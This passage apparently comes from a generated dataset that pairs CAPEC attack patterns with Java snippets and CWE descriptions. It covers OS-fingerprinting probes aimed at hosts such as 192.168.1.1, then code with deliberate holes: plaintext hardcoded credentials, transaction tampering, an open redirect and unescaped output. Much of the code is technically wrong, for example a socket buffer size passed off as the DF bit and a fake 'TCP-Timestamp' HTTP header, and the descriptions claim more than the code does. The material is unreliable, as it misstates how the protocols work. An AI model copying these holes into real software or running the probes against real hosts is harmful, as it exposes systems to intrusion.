        "description": "This Java code snippet demonstrates the concept of an IP 'ID' Echoed Byte-Order Probe. The code sends a UDP datagram with an arbitrary IP 'ID' value to a closed port on a remote host. The main idea is to observe how the remote host echoes back the IP 'ID' value in the ICMP error message, which can be used for OS fingerprinting. The code also touches on related CWEs by highlighting potential vulnerabilities such as exposure of sensitive information (CWE-200) and improper management of identifiers (CWE-1192, CWE-1290, CWE-1302, CWE-1323). The actual analysis of the ICMP error message and the echoed IP 'ID' value is not implemented for simplicity."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\n\npublic class IPFragmentationProbe {\n    public static void main(String[] args) {\n        try {\n            InetAddress targetAddress = InetAddress.getByName(\"192.168.1.1\"); // Target IP\n            byte[] data = new byte[1]; // Minimal data\n            DatagramPacket packet = new DatagramPacket(data, data.length, targetAddress, 12345); // Closed port\n            DatagramSocket socket = new DatagramSocket();\n            socket.setSendBufferSize(1); // Set small buffer to simulate DF bit\n            socket.send(packet);\n            System.out.println(\"Packet sent with DF bit set.\");\n\n            // Listen for ICMP response\n            byte[] buffer = new byte[1024];\n            DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n            socket.receive(response);\n            System.out.println(\"Received response from: \" + response.getAddress());\n\n            // Check if DF bit is echoed back (simplified check)\n            if (buffer[0] == 0x40) { // Assuming 0x40 represents DF bit set in response\n                System.out.println(\"DF bit echoed back.\");\n            } else {\n                System.out.println(\"DF bit not echoed back.\");\n            }\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + e.getMessage());\n        } catch (SocketException e) {\n            System.err.println(\"Socket error: \" + e.getMessage());\n        } catch (Exception e) {\n            System.err.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an IP fragmentation probe to test if a remote host echoes back the 'Don't Fragment' (DF) bit in a response packet. The code sends a UDP datagram with the DF bit set to a closed port on the target host. It then listens for an ICMP response to check if the DF bit is echoed back. This technique can be used for OS fingerprinting, as different operating systems handle the DF bit differently. The code also highlights potential weaknesses such as exposure of sensitive information (CWE-200) and incorrectly specified destinations in communication channels (CWE-941)."
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class TcpTimestampServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server is listening on port 8080\");\n\n        while (true) {\n            Socket socket = serverSocket.accept();\n            new Thread(new ClientHandler(socket)).start();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket socket;\n\n    public ClientHandler(Socket socket) {\n        this.socket = socket;\n    }\n\n    @Override\n    public void run() {\n        try (InputStream input = socket.getInputStream(); OutputStream output = socket.getOutputStream()) {\n            byte[] buffer = new byte[1024];\n            int bytesRead = input.read(buffer);\n\n            // Simulate processing and include a TCP timestamp in the response\n            long timestamp = System.currentTimeMillis();\n            String response = \"HTTP/1.1 200 OK\\r\\n\" +\n                             \"Content-Type: text/plain\\r\\n\" +\n                             \"Content-Length: \" + bytesRead + \"\\r\\n\" +\n                             \"TCP-Timestamp: \" + timestamp + \"\\r\\n\" +\n                             \"\\r\\n\" +\n                             new String(buffer, 0, bytesRead);\n            output.write(response.getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple TCP server that listens on port 8080 and responds to incoming connections with a message that includes a TCP timestamp. The server accepts connections and spawns a new thread for each client to handle the communication. The ClientHandler class reads data from the client, processes it, and sends back a response that includes a simulated TCP timestamp in the HTTP header.\n\nThe code embodies the main idea of the CAPEC 'TCP Timestamp Probe' by including a timestamp in the TCP header of the response. This can be used by an attacker to guess the operating system of the target based on the timestamp values. The related CWEs are represented as follows:\n- CWE-200: The timestamp can expose sensitive information about the system's timing behavior.\n- CWE-208: The timestamp can create observable timing discrepancies that reveal security-relevant information.\n- CWE-319: The response is sent in cleartext, which can be sniffed by unauthorized actors.\n\nThis code demonstrates how a TCP timestamp can be included in a response, potentially exposing the system to fingerprinting attacks."
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Random;\n\npublic class TCPSequenceNumberProbe {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            System.out.println(\"Client connected\");\n\n            // Generate a predictable sequence number\n            long currentTime = System.currentTimeMillis();\n            int sequenceNumber = (int) (currentTime % Integer.MAX_VALUE);\n            System.out.println(\"Generated Sequence Number: \" + sequenceNumber);\n\n            // Simulate sending a response with the sequence number\n            clientSocket.getOutputStream().write(sequenceNumber);\n            clientSocket.close();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple TCP server that listens on port 8080 and generates a predictable TCP sequence number based on the current system time. When a client connects, the server calculates a sequence number using the current time modulo the maximum integer value, which is then sent back to the client. This approach embodies the main idea of the CAPEC 'TCP Sequence Number Probe' by illustrating how an attacker could predict TCP sequence numbers to fingerprint the operating system. The code also highlights CWE-337 'Predictable Seed in Pseudo-Random Number Generator (PRNG)' by using a predictable method (current system time) to generate sequence numbers, making it vulnerable to sequence number prediction attacks."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SocketChannel;\n\npublic class ISNProbe {\n    public static void main(String[] args) {\n        String targetHost = \"192.168.1.1\"; // Target IP address\n        int targetPort = 80; // Target port\n        try {\n            InetAddress address = InetAddress.getByName(targetHost);\n            SocketChannel socketChannel = SocketChannel.open();\n            socketChannel.connect(new java.net.InetSocketAddress(address, targetPort));\n            Socket socket = socketChannel.socket();\n            socket.setSoTimeout(2000);\n\n            // Send TCP SYN packet\n            ByteBuffer buffer = ByteBuffer.allocate(1024);\n            buffer.put(createSYNPacket());\n            buffer.flip();\n            socketChannel.write(buffer);\n\n            // Read TCP SYN/ACK response\n            buffer.clear();\n            socketChannel.read(buffer);\n            buffer.flip();\n\n            // Extract ISN from SYN/ACK response\n            int isn = extractISN(buffer);\n            System.out.println(\"Extracted ISN: \" + isn);\n\n            // Compare ISN with known OS patterns (simplified example)\n            if (isn % 2 == 0) {\n                System.out.println(\"Likely OS: ExampleOS v1.0\");\n            } else {\n                System.out.println(\"Likely OS: ExampleOS v2.0\");\n            }\n\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static byte[] createSYNPacket() {\n        // Simplified SYN packet creation\n        byte[] synPacket = new byte[20];\n        // Set SYN flag and other necessary fields\n        synPacket[13] = 0x02;\n        return synPacket;\n    }\n\n    private static int extractISN(ByteBuffer buffer) {\n        // Simplified ISN extraction from TCP header\n        buffer.position(4); // Skip to ISN field\n        return buffer.getInt();\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a TCP Initial Sequence Number (ISN) probe, which is used for OS fingerprinting. The code sends a TCP SYN packet to a specified target host and port, then reads the SYN/ACK response to extract the ISN. The extracted ISN is analyzed to infer the operating system of the target machine. This process embodies the CAPEC description by leveraging the ISN to identify the OS type and version. The code also touches on related CWEs by potentially exposing sensitive system information (CWE-497) and transmitting data that could be intercepted (CWE-319)."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "import java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.IOException;\n\npublic class ISNProbe {\n    private static final int PORT = 12345;\n    private static final int SAMPLE_SIZE = 100;\n    private static long[] isnSamples = new long[SAMPLE_SIZE];\n\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(PORT);\n        int sampleIndex = 0;\n\n        while (sampleIndex < SAMPLE_SIZE) {\n            Socket clientSocket = serverSocket.accept();\n            long isn = clientSocket.getInputStream().read(); // Simulated ISN read\n            isnSamples[sampleIndex++] = isn;\n            clientSocket.close();\n        }\n\n        analyzeISNIncrements();\n    }\n\n    private static void analyzeISNIncrements() {\n        long totalIncrement = 0;\n        for (int i = 1; i < SAMPLE_SIZE; i++) {\n            totalIncrement += (isnSamples[i] - isnSamples[i - 1]);\n        }\n        long averageIncrement = totalIncrement / (SAMPLE_SIZE - 1);\n        System.out.println(\"Average ISN Increment: \" + averageIncrement);\n        // Compare against known OS database (not implemented)\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a TCP Initial Sequence Number (ISN) counter rate probe. The program listens on a specified port and collects a sample of ISNs from incoming connections. It then calculates the average increment of these ISNs over the sample period. This average increment can be used to infer the operating system of the host based on known patterns of ISN increments. The code embodies the main idea of CAPEC-Name: 'TCP (ISN) Counter Rate Probe' by performing timing analysis on ISN increments. The related CWEs are represented as follows: CWE-200 (Exposure of Sensitive Information) is demonstrated by the potential exposure of ISN patterns, CWE-367 and CWE-362 (Race Conditions) are implied by the concurrent handling of socket connections, and CWE-385 (Covert Timing Channel) is represented by the timing analysis of ISN increments."
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "import java.util.Random;\n\npublic class PredictableISN {\n    private static final int SEED = (int) (System.currentTimeMillis() % Integer.MAX_VALUE);\n    private Random random;\n\n    public PredictableISN() {\n        this.random = new Random(SEED);\n    }\n\n    public int generateISN() {\n        return random.nextInt();\n    }\n\n    public static void main(String[] args) {\n        PredictableISN isnGenerator = new PredictableISN();\n        System.out.println(\"Generated ISN: \" + isnGenerator.generateISN());\n    }\n}",
        "description": "This Java code snippet demonstrates a predictable Initial Sequence Number (ISN) generator, which embodies the main idea of the CAPEC 'TCP (ISN) Sequence Predictability Probe'. The code initializes a pseudo-random number generator (PRNG) with a predictable seed based on the current system time. This makes the generated sequence numbers predictable, which is a vulnerability described by CWE-337 ('Predictable Seed in Pseudo-Random Number Generator (PRNG)'). The predictability of the ISN can be exploited by an attacker to hijack TCP sessions. The code also indirectly touches on CWE-341 ('Predictable from Observable State') since the seed is derived from the system time, an observable state. The main point of the CAPEC is to highlight the risk of predictable sequence numbers in TCP connections, which can be probed and exploited by attackers."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class ECNProbe {\n    public static void main(String[] args) throws IOException {\n        String targetHost = \"192.168.1.1\";\n        int targetPort = 80;\n        byte[] ecnProbePacket = new byte[20]; // Simplified ECN probe packet\n\n        // Set ECN flags in the IP header (simplified, not actual implementation)\n        ecnProbePacket[1] = 0x03; // ECN flags set\n\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(targetHost);\n        DatagramPacket packet = new DatagramPacket(ecnProbePacket, ecnProbePacket.length, address, targetPort);\n\n        // Send the ECN probe packet\n        socket.send(packet);\n\n        // Receive the response\n        byte[] buffer = new byte[1024];\n        DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n        socket.receive(response);\n\n        // Print the response (potentially exposing sensitive information)\n        System.out.println(\"Response: \" + new String(response.getData()));\n\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an ECN (Explicit Congestion Notification) probe to check if a remote host supports ECN messaging. The code constructs a UDP packet with ECN flags set and sends it to a target host. It then waits for a response and prints it out. This process can be used for OS fingerprinting based on how different systems respond to the ECN probe. The code embodies the main idea of the CAPEC by probing for ECN support and potentially exposing sensitive information (CWE-200) in the response. Additionally, it does not include integrity checks (CWE-353) or protection for the transmitted data (CWE-319), and it could be exploited to generate excessive network traffic (CWE-406)."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class TCPWindowSizeProbe {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                int initialWindowSize = clientSocket.getReceiveBufferSize();\n                System.out.println(\"Initial TCP Window Size: \" + initialWindowSize);\n                // CWE-200: Exposure of Sensitive Information\n                // CWE-188: Reliance on Data/Memory Layout\n                // CWE-121: Stack-based Buffer Overflow (potentially exploitable if buffer sizes are mishandled)\n                // CWE-806: Buffer Access Using Size of Source Buffer (potentially exploitable if buffer sizes are mishandled)\n                // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime (not directly applicable in this context)\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet sets up a simple TCP server that listens on port 8080. When a client connects, it retrieves and prints the initial TCP window size of the connection. This demonstrates the concept of 'TCP Initial Window Size Probe' by exposing the initial window size, which can be used for OS fingerprinting. The code also highlights potential vulnerabilities: CWE-200 (exposure of sensitive information), CWE-188 (reliance on data/memory layout), CWE-121 and CWE-806 (buffer overflow issues if buffer sizes are mishandled). CWE-1313 is mentioned for completeness but is not directly applicable in this context."
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Arrays;\n\npublic class TcpOptionsProbe {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                byte[] tcpOptions = new byte[40]; // Maximum TCP options size\n                clientSocket.getInputStream().read(tcpOptions);\n                analyzeTcpOptions(tcpOptions);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void analyzeTcpOptions(byte[] tcpOptions) {\n        // Simulate analysis of TCP options\n        System.out.println(\"Received TCP options: \" + Arrays.toString(tcpOptions));\n        // Potentially expose sensitive information\n        if (tcpOptions[0] == 1) { // Example condition\n            System.out.println(\"Sensitive information exposed: \" + Arrays.toString(tcpOptions));\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple TCP server that listens on port 8080 and accepts incoming connections. When a client connects, it reads the TCP options from the incoming packet and analyzes them. The `analyzeTcpOptions` method simulates the analysis of TCP options and prints them out. If a specific condition is met (e.g., the first byte of the TCP options is 1), it prints out the TCP options, potentially exposing sensitive information. This code embodies the main idea of the CAPEC 'TCP Options Probe' by analyzing the type and order of TCP header options. It also touches on related CWEs such as 'Exposure of Sensitive Information to an Unauthorized Actor' by potentially exposing sensitive TCP option data, and 'Reliance on Data/Memory Layout' by making assumptions about the structure of the TCP options."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class TcpRstProbe {\n    public static void main(String[] args) throws IOException {\n        String sensitiveData = \"Sensitive Information\";\n        byte[] buffer = sensitiveData.getBytes();\n        InetAddress address = InetAddress.getByName(\"192.168.1.1\");\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, 8080);\n        DatagramSocket socket = new DatagramSocket();\n\n        // Send the packet\n        socket.send(packet);\n\n        // Receive the response\n        byte[] responseBuffer = new byte[1024];\n        DatagramPacket responsePacket = new DatagramPacket(responseBuffer, responseBuffer.length);\n        socket.receive(responsePacket);\n\n        // Print the response (potentially exposing sensitive information)\n        String response = new String(responsePacket.getData(), 0, responsePacket.getLength());\n        System.out.println(\"Received: \" + response);\n\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a simple UDP client that sends a packet containing sensitive information to a specified IP address and port, then waits for a response. The response is printed to the console, potentially exposing sensitive information. This embodies the main idea of the CAPEC 'TCP 'RST' Flag Checksum Probe' by illustrating how sensitive information can be exposed through network communication. The code also highlights related CWEs such as CWE-200 (Exposure of Sensitive Information), CWE-319 (Cleartext Transmission of Sensitive Information), and CWE-354 (Improper Validation of Integrity Check Value) by not validating the integrity of the data and transmitting it in cleartext."
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\n\npublic class ICMPEcho {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            InetAddress address = InetAddress.getByName(\"target.example.com\");\n            byte[] buf = new byte[256];\n            DatagramPacket packet = new DatagramPacket(buf, buf.length, address, 7);\n            socket.send(packet);\n\n            // Receive ICMP error message\n            byte[] recvBuf = new byte[512];\n            DatagramPacket recvPacket = new DatagramPacket(recvBuf, recvBuf.length);\n            socket.receive(recvPacket);\n\n            // Print the received data (potentially sensitive information)\n            String received = new String(recvPacket.getData(), 0, recvPacket.getLength());\n            System.out.println(\"Received: \" + received);\n        } catch (SocketException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic implementation of an ICMP Echo request to a target server, which can potentially trigger an ICMP error message. The code sends a UDP packet to a specified address and port, then waits to receive an ICMP error message. Upon receiving the message, it prints the data contained in the message, which may include sensitive information. This example embodies the CAPEC 'ICMP Error Message Quoting Probe' by illustrating how an adversary might generate and analyze ICMP error messages to extract sensitive information. The code also touches on related CWEs, such as the exposure of sensitive information (CWE-200) and the generation of error messages containing sensitive information (CWE-209)."
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ICMPErrorProbe {\n    public static void main(String[] args) throws IOException {\n        String target = \"192.168.1.1\";\n        byte[] buffer = new byte[1024];\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(target);\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, 80);\n\n        // Send a packet to the target\n        socket.send(packet);\n\n        // Wait for an ICMP error message\n        DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n        socket.receive(response);\n\n        // Print the received data (potentially sensitive information)\n        System.out.println(\"Received: \" + new String(response.getData(), 0, response.getLength()));\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an ICMP Error Message Echoing Integrity Probe. The code sends a UDP packet to a specified target address and port, then waits for an ICMP error message in response. When an ICMP error message is received, the code prints the data contained in the response. This data may include sensitive information from the original request, which can be analyzed by an adversary. The code embodies the main idea of CAPEC-ICMP Error Message Echoing Integrity Probe and highlights related CWEs such as exposure of sensitive information (CWE-200, CWE-211) and missing support for integrity checks (CWE-353)."
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class ICMPTotalLengthProbe {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            InetAddress targetAddress = InetAddress.getByName(\"192.168.1.1\");\n            byte[] buffer = new byte[10]; // Small buffer to simulate improper length handling\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, 12345); // Closed port\n            socket.send(packet);\n\n            byte[] recvBuffer = new byte[1024];\n            DatagramPacket response = new DatagramPacket(recvBuffer, recvBuffer.length);\n            socket.receive(response);\n\n            // Extract IP Total Length field from the response (simplified)\n            int ipTotalLength = ((recvBuffer[2] & 0xFF) << 8) | (recvBuffer[3] & 0xFF);\n            System.out.println(\"IP Total Length: \" + ipTotalLength);\n\n            // Simulate observable response discrepancy\n            if (ipTotalLength != buffer.length) {\n                System.out.println(\"Discrepancy detected: IP Total Length does not match sent buffer length.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an ICMP IP Total Length Field Probe attack. The code sends a UDP packet to a closed port on a target machine to elicit an 'ICMP Port Unreachable' error message. The response is then analyzed to extract the IP Total Length field. The code highlights several weaknesses: improper handling of length parameters (CWE-130), observable response discrepancies (CWE-204), and the potential for cleartext transmission of sensitive information (CWE-319). The main idea is to show how an adversary can use discrepancies in error message responses to gather information about the target system's internal state."
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class IcmpProbe {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            byte[] buffer = new byte[1024];\n            InetAddress targetAddress = InetAddress.getByName(\"192.168.1.1\");\n            int targetPort = 12345; // Closed port\n\n            // Create a UDP packet with a specific ID in the payload\n            buffer[0] = 0x12; // Example ID value\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, targetPort);\n            socket.send(packet);\n\n            // Wait for ICMP error message\n            DatagramPacket response = new DatagramPacket(new byte[1024], 1024);\n            socket.receive(response);\n\n            // Process the ICMP error message\n            byte[] responseData = response.getData();\n            System.out.println(\"Received ICMP error message with ID: \" + responseData[0]);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of an ICMP IP 'ID' Field Error Message Probe. The code sends a UDP datagram with a specific ID value to a closed port on a target machine. When the target machine responds with an ICMP error message, the code captures and processes this message to observe how the ID field is echoed back. This behavior can be used to fingerprint the operating system of the target machine. The code also touches on related CWEs by potentially revealing internal state information (CWE-204) and handling externally-generated error messages that may contain sensitive information (CWE-211)."
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class EventMonitor {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Event hosted on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ClientHandler(clientSocket)).start();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ClientHandler(Socket socket) {\n        this.clientSocket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            String userId;\n            while ((userId = in.readLine()) != null) {\n                System.out.println(\"User ID: \" + userId); // Logging user IDs in cleartext\n            }\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple server that hosts an event on port 8080. The server accepts client connections and spawns a new thread for each client to handle incoming data. The ClientHandler class reads user IDs from the client input stream and logs them in cleartext. This embodies the CAPEC idea of 'Harvesting Information via API Event Monitoring' by showing how an adversary could host an event and monitor the data exchanged during the event. The code also highlights several related CWEs: \n- CWE-311 (Missing Encryption of Sensitive Data): User IDs are logged in cleartext without encryption.\n- CWE-319 (Cleartext Transmission of Sensitive Information): User IDs are transmitted in cleartext.\n- CWE-419 (Unprotected Primary Channel): The communication channel is not protected.\n- CWE-602 (Client-Side Enforcement of Server-Side Security): The server relies on the client to send user IDs without any security enforcement.\n- CWE-202 (Exposure of Sensitive Information Through Data Queries): The server logs sensitive user IDs, which could be harvested by an attacker."
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableAPIClient {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/api/data\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n\n            // CWE-311: Missing Encryption of Sensitive Data\n            String payload = \"{\\\"username\\\":\\\"admin\\\", \\\"password\\\":\\\"password123\\\"}\";\n            OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());\n            writer.write(payload);\n            writer.flush();\n            writer.close();\n\n            // Read response\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String line;\n            StringBuilder response = new StringBuilder();\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n\n            // CWE-345: Insufficient Verification of Data Authenticity\n            System.out.println(\"Response: \" + response.toString());\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable API client that communicates with a server. The client sends a POST request with sensitive data (username and password) in plaintext, which embodies CWE-311 (Missing Encryption of Sensitive Data). The response from the server is read and printed without any verification of its authenticity, representing CWE-345 (Insufficient Verification of Data Authenticity). This setup can be exploited by an attacker performing an Application API Message Manipulation via Man-in-the-Middle attack, as the client trusts the integrity of the data and does not verify its source or authenticity."
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class TransactionTampering {\n    public static void main(String[] args) throws Exception {\n        // Simulate a client sending a transaction\n        String originalTransaction = \"amount=100&recipient=JohnDoe\";\n        System.out.println(\"Original Transaction: \" + originalTransaction);\n\n        // Attacker intercepts and modifies the transaction\n        String tamperedTransaction = tamperTransaction(originalTransaction);\n        System.out.println(\"Tampered Transaction: \" + tamperedTransaction);\n\n        // Simulate sending the tampered transaction to the server\n        sendTransaction(tamperedTransaction);\n    }\n\n    private static String tamperTransaction(String transaction) {\n        // CWE-471: Modification of Assumed-Immutable Data\n        return transaction.replace(\"amount=100\", \"amount=1000\");\n    }\n\n    private static void sendTransaction(String transaction) throws IOException {\n        // CWE-311: Missing Encryption of Sensitive Data\n        URL url = new URL(\"http://example.com/transaction\");\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setDoOutput(true);\n        conn.setRequestMethod(\"POST\");\n        OutputStream os = conn.getOutputStream();\n        os.write(transaction.getBytes());\n        os.flush();\n        os.close();\n\n        // CWE-345: Insufficient Verification of Data Authenticity\n        if (conn.getResponseCode() == 200) {\n            System.out.println(\"Transaction sent successfully.\");\n        } else {\n            System.out.println(\"Transaction failed.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified scenario of transaction tampering via application API manipulation. The main idea is to show how an attacker can intercept and modify a transaction before it is sent to the server. The original transaction is altered to change the amount from 100 to 1000, representing CWE-471 (Modification of Assumed-Immutable Data). The tampered transaction is then sent to the server without encryption (CWE-311: Missing Encryption of Sensitive Data). The server does not verify the authenticity of the data (CWE-345: Insufficient Verification of Data Authenticity), allowing the tampered transaction to be processed. This code highlights the vulnerabilities and potential attack vectors described in the CAPEC."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/profile\")\npublic class ProfileServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userId = request.getParameter(\"userId\");\n        String profileImageUrl = getProfileImageUrl(userId);\n        String profileLink = \"<a href='\" + profileImageUrl + \"'>View Profile</a>\";\n        response.getWriter().write(profileLink);\n    }\n\n    private String getProfileImageUrl(String userId) {\n        // Simulate fetching a profile image URL from a database\n        // Insecure: No validation of the URL, allowing potential navigation remapping\n        return \"http://example.com/profiles/\" + userId + \"/image.jpg\";\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability related to 'Application API Navigation Remapping'. The servlet generates a profile link based on a user ID parameter without validating the authenticity or origin of the URL. This can be exploited by an attacker to manipulate the URL, leading to potential phishing attacks or redirecting users to malicious sites. The code also lacks encryption for sensitive data and relies on client-side enforcement of security, making it susceptible to various attacks as described in the related CWEs."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String redirectUrl = request.getParameter(\"redirectUrl\");\n        String message = request.getParameter(\"message\");\n\n        // CWE-345: Insufficient Verification of Data Authenticity\n        // CWE-346: Origin Validation Error\n        if (redirectUrl != null && !redirectUrl.isEmpty()) {\n            // CWE-602: Client-Side Enforcement of Server-Side Security\n            response.sendRedirect(redirectUrl);\n        }\n\n        // CWE-311: Missing Encryption of Sensitive Data\n        // CWE-471: Modification of Assumed-Immutable Data (MAID)\n        if (message != null && !message.isEmpty()) {\n            // Display the message without any validation or encoding\n            response.getWriter().write(\"Message: \" + message);\n        }\n    }\n}",
